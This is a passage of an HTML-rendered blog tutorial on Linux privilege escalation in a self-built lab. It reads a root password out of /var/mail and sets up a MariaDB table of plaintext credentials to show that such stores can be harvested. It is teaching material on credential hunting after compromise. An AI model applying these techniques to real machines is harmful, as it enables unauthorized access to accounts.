</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ swaks --server 10.10.10.14 --port <span class="m">25</span> --from <span class="s1">&#39;user@mail.com&#39;</span> --to <span class="s1">&#39;user@mail.user.com&#39;</span> --body <span class="s1">&#39;Hi, the root password is: root&#39;</span>
</span></span><span class="line"><span class="cl"><span class="o">===</span> Trying 10.10.10.14:25...
</span></span><span class="line"><span class="cl"><span class="o">===</span> Connected to 10.10.10.14.
</span></span><span class="line"><span class="cl">&lt;-  <span class="m">220</span> mail.user.com ESMTP Postfix <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl"> -&gt; EHLO kali
</span></span><span class="line"><span class="cl">&lt;-  250-mail.user.com
</span></span><span class="line"><span class="cl">&lt;-  250-PIPELINING
</span></span><span class="line"><span class="cl">&lt;-  250-SIZE <span class="m">10240000</span>
</span></span><span class="line"><span class="cl">&lt;-  250-VRFY
</span></span><span class="line"><span class="cl">&lt;-  250-ETRN
</span></span><span class="line"><span class="cl">&lt;-  250-STARTTLS
</span></span><span class="line"><span class="cl">&lt;-  250-ENHANCEDSTATUSCODES
</span></span><span class="line"><span class="cl">&lt;-  250-8BITMIME
</span></span><span class="line"><span class="cl">&lt;-  250-DSN
</span></span><span class="line"><span class="cl">&lt;-  250-SMTPUTF8
</span></span><span class="line"><span class="cl">&lt;-  <span class="m">250</span> CHUNKING
</span></span><span class="line"><span class="cl"> -&gt; MAIL FROM:&lt;user@mail.com&gt;
</span></span><span class="line"><span class="cl">&lt;-  <span class="m">250</span> 2.1.0 Ok
</span></span><span class="line"><span class="cl"> -&gt; RCPT TO:&lt;user@mail.user.com&gt;
</span></span><span class="line"><span class="cl">&lt;-  <span class="m">250</span> 2.1.5 Ok
</span></span><span class="line"><span class="cl"> -&gt; DATA
</span></span><span class="line"><span class="cl">&lt;-  <span class="m">354</span> End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
</span></span><span class="line"><span class="cl"> -&gt; Date: Thu, <span class="m">06</span> Jan <span class="m">2021</span> 19:20:27 -0500
</span></span><span class="line"><span class="cl"> -&gt; To: user@mail.user.com
</span></span><span class="line"><span class="cl"> -&gt; From: user@mail.com
</span></span><span class="line"><span class="cl"> -&gt; Subject: <span class="nb">test</span> Thu, <span class="m">06</span> Jan <span class="m">2021</span> 19:20:27 -0500
</span></span><span class="line"><span class="cl"> -&gt; Message-Id: &lt;20210106192027.083181@kali&gt;
</span></span><span class="line"><span class="cl"> -&gt; X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
</span></span><span class="line"><span class="cl"> -&gt;
</span></span><span class="line"><span class="cl"> -&gt; Hi, The root password is: root
</span></span><span class="line"><span class="cl"> -&gt;
</span></span><span class="line"><span class="cl"> -&gt;
</span></span><span class="line"><span class="cl"> -&gt; .
</span></span><span class="line"><span class="cl">&lt;-  <span class="m">250</span> 2.0.0 Ok: queued as CC8EAA5619
</span></span><span class="line"><span class="cl"> -&gt; QUIT
</span></span><span class="line"><span class="cl">&lt;-  <span class="m">221</span> 2.0.0 <span class="nv">Bye</span>
</span></span><span class="line"><span class="cl"><span class="o">===</span> Connection closed with remote host.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Alright as the adversary let&rsquo;s find this email in the target machine:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat /var/mail/user
</span></span><span class="line"><span class="cl">From user@mail.com  Thu Jan  <span class="m">6</span> 20:20:27 <span class="m">2021</span>
</span></span><span class="line"><span class="cl">Return-Path: &lt;user@mail.com&gt;
</span></span><span class="line"><span class="cl">X-Original-To: user@mail.user.com
</span></span><span class="line"><span class="cl">Delivered-To: user@mail.user.com
</span></span><span class="line"><span class="cl">Received: from kali <span class="o">(</span>unknown <span class="o">[</span>10.10.10.15<span class="o">])</span>
</span></span><span class="line"><span class="cl">	by mail.user.com <span class="o">(</span>Postfix<span class="o">)</span> with ESMTP id CC8EAA5619
</span></span><span class="line"><span class="cl">	<span class="k">for</span> &lt;user@mail.user.com&gt;<span class="p">;</span> Thu,  <span class="m">6</span> Jan <span class="m">2021</span> 20:20:27 -0400 <span class="o">(</span>AST<span class="o">)</span>
</span></span><span class="line"><span class="cl">Date: Thu, <span class="m">06</span> Jan <span class="m">2021</span> 19:20:27 -0500
</span></span><span class="line"><span class="cl">To: user@mail.user.com
</span></span><span class="line"><span class="cl">From: user@mail.com
</span></span><span class="line"><span class="cl">Subject: <span class="nb">test</span> Thu, <span class="m">06</span> Jan <span class="m">2021</span> 19:20:27 -0500
</span></span><span class="line"><span class="cl">Message-Id: &lt;20210106192027.083181@kali&gt;
</span></span><span class="line"><span class="cl">X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Hi, The root password is: root
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see from the output above, we can find emails that were sent to this server in the <code>/var/mail</code> directory. Since this user sent a password we could try to use this password against all the users in the system or simply try to log in as the root user as specified in the message.</p>
<h1 id="privilege-escalation-via-databases">Privilege Escalation via Databases</h1>
<p>It is very common to see credentials in databases that belong to web applications. Often the passwords of these credentials are hashed but sometimes we might see them in plaintext.</p>
<h3 id="mariadb-scenario">MariaDB Scenario:</h3>
<p>For the sake of simplicity, I&rsquo;m just gonna create a simple database with one table that contains credentials in plaintext.</p>
<p>Install the MySQL client:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt install -y mariadb-server mariadb-client
</span></span></code></pre></td></tr></table>
</div>
</div><p>Login to the MySQL service in localhost:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo mysql -h localhost -u root
</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
</span></span><span class="line"><span class="cl">Your MariaDB connection id is <span class="m">54</span>
</span></span><span class="line"><span class="cl">Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt; 
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s create a MariaDB user:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">MariaDB</span><span class="w"> </span><span class="p">[</span><span class="n">mysql</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="n">USE</span><span class="w"> </span><span class="n">mysql</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Database</span><span class="w"> </span><span class="n">changed</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">MariaDB</span><span class="w"> </span><span class="p">[</span><span class="n">mysql</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">CREATE</span><span class="w"> </span><span class="k">USER</span><span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="o">@</span><span class="s1">&#39;localhost&#39;</span><span class="w"> </span><span class="n">IDENTIFIED</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="s1">&#39;pass321&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Query</span><span class="w"> </span><span class="n">OK</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="n">affected</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">MariaDB</span><span class="w"> </span><span class="p">[</span><span class="n">mysql</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">GRANT</span><span class="w"> </span><span class="k">ALL</span><span class="w"> </span><span class="k">PRIVILEGES</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="o">*</span><span class="p">.</span><span class="o">*</span><span class="w"> </span><span class="k">TO</span><span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="o">@</span><span class="s1">&#39;localhost&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Query</span><span class="w"> </span><span class="n">OK</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="n">affected</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">000</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">MariaDB</span><span class="w"> </span><span class="p">[</span><span class="n">mysql</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">UPDATE</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">plugin</span><span class="o">=</span><span class="s1">&#39;unix_socket&#39;</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="k">User</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Query</span><span class="w"> </span><span class="n">OK</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="n">affected</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Rows</span><span class="w"> </span><span class="n">matched</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">  </span><span class="n">Changed</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">  </span><span class="n">Warnings</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">MariaDB</span><span class="w"> </span><span class="p">[</span><span class="n">mysql</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="n">FLUSH</span><span class="w"> </span><span class="k">PRIVILEGES</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Query</span><span class="w"> </span><span class="n">OK</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="n">affected</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">MariaDB</span><span class="w"> </span><span class="p">[</span><span class="n">mysql</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="n">exit</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Bye</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: A of MySQL 8.0.4 the new default authentication plugin is &lsquo;caching_sha2_password&rsquo; which we can log in from the Bash shell now with &ldquo;mysql -u YOUR_SYSTEM_USER -p&rdquo; and provide the password for this user on the prompt. There isn’t any need for the &ldquo;UPDATE user SET plugin&rdquo; step.</p>
</blockquote>
<p>Restart the MySQL service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo service mysql restart
</span></span></code></pre></td></tr></table>
</div>
</div><p>Show the databases:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt; SHOW databases<span class="p">;</span>
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> Database           <span class="p">|</span>
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl"><span class="p">|</span> information_schema <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> mysql              <span class="p">|</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> performance_schema <span class="p">|</span>
</span></span><span class="line"><span class="cl">+--------------------+
</span></span><span class="line"><span class="cl"><span class="m">3</span> rows in <span class="nb">set</span> <span class="o">(</span>0.001 sec<span class="o">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Create a database called <code>test</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">MariaDB</span><span class="w"> </span><span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">CREATE</span><span class="w"> </span><span class="k">DATABASE</span><span class="w"> </span><span class="n">test</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Query</span><span class="w"> </span><span class="n">OK</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">row</span><span class="w"> </span><span class="n">affected</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">003</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Use the <a href="https://dev.mysql.com/doc/refman/8.0/en/show.html" title="13.7.7 SHOW Statements" target="_blank" rel="noopener noreffer "><code>SHOW</code></a> statement to find out what databases currently exist on the server:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">MariaDB</span><span class="w"> </span><span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SHOW</span><span class="w"> </span><span class="n">DATABASES</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">--------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="k">Database</span><span class="w">           </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">--------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">information_schema</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">mysql</span><span class="w">              </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">performance_schema</span><span class="w"> </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="n">test</span><span class="w">               </span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">--------------------+
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">4</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Use the <code>USE</code> statement to use the database:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">MariaDB</span><span class="w"> </span><span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span><span class="w"> </span><span class="n">USE</span><span class="w"> </span><span class="n">test</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">Database</span><span class="w"> </span><span class="n">changed</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">MariaDB</span><span class="w"> </span><span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> 
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Create a table with usernames and passwords:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">`</span><span class="n">id</span><span class="o">`</span><span class="w"> </span><span class="nb">int</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="n">AUTO_INCREMENT</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">`</span><span class="n">employee_id</span><span class="o">`</span><span class="w"> </span><span class="nb">int</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">`</span><span class="n">user_type</span><span class="o">`</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">`</span><span class="n">username</span><span class="o">`</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">`</span><span class="n">password</span><span class="o">`</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="w"> </span><span class="p">(</span><span class="o">`</span><span class="n">id</span><span class="o">`</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="w"> </span><span class="n">ENGINE</span><span class="o">=</span><span class="n">InnoDB</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="n">CHARSET</span><span class="o">=</span><span class="n">utf8</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The query looks like these in MariaDB:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">MariaDB</span><span class="w"> </span><span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="o">&gt;</span><span class="w"> </span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">-&gt;</span><span class="w">   </span><span class="o">`</span><span class="n">id</span><span class="o">`</span><span class="w"> </span><span class="nb">int</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="w"> </span><span class="n">AUTO_INCREMENT</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">-&gt;</span><span class="w">   </span><span class="o">`</span><span class="n">employee_id</span><span class="o">`</span><span class="w"> </span><span class="nb">int</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">-&gt;</span><span class="w">   </span><span class="o">`</span><span class="n">user_type</span><span class="o">`</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">50</span><span class="p">)</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">-&gt;</span><span class="w">   </span><span class="o">`</span><span class="n">username</span><span class="o">`</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">-&gt;</span><span class="w">   </span><span class="o">`</span><span class="n">password</span><span class="o">`</span><span class="w"> </span><span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span><span class="w"> </span><span class="k">NOT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">-&gt;</span><span class="w">   </span><span class="k">PRIMARY</span><span class="w"> </span><span class="k">KEY</span><span class="w"> </span><span class="p">(</span><span class="o">`</span><span class="n">id</span><span class="o">`</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="o">-&gt;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="n">ENGINE</span><span class="o">=</span><span class="n">InnoDB</span><span class="w"> </span><span class="k">DEFAULT</span><span class="w"> </span><span class="n">CHARSET</span><span class="o">=</span><span class="n">utf8</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Query</span><span class="w"> </span><span class="n">OK</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="n">affected</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">010</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Insert data into the users&rsquo; table:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="o">`</span><span class="n">users</span><span class="o">`</span><span class="w"> </span><span class="p">(</span><span class="o">`</span><span class="n">employee_id</span><span class="o">`</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">user_type</span><span class="o">`</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">username</span><span class="o">`</span><span class="p">,</span><span class="w"> </span><span class="o">`</span><span class="n">password</span><span class="o">`</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="p">(</span><span class="k">NULL</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;SUPER ADMIN&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;root&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;pass123&#39;</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;NORMAL&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;pass321&#39;</span><span class="p">),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                   </span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;ADMIN&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;hello&#39;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>The query looks like this in MariaDB:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
